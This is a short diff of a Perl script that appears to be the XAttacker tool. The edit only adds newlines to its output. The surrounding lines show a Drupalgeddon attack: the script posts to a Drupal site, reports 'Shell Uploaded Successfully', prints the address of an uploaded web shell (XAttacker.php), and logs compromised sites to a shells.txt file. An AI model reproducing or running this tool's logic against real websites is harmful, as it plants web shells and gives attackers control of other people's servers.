@@ -3012,7 +3012,7 @@ $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [f
 if ($response =~ /200/){
 print item(),"Drupalgeddon";
 print color('bold white')," ...................... ";
-print color('bold green'),"VULN\n";
+print color('bold green'),"VULN\n\n";
 print item(),"Shell Uploaded Successfully\n";
 print color('bold white'),"  [Link] => $site/XAttacker.php?X=Attacker\n";
 open (TEXT, '>>Result/shells.txt');
@@ -3021,7 +3021,7 @@ close (TEXT);
 }else{
 print item(),"Drupalgeddon";
 print color('bold white')," ...................... ";
-print color('bold red'),"NOt VULN\n";
+print color('bold red'),"NOt VULN\n\n";
 }
 }
 
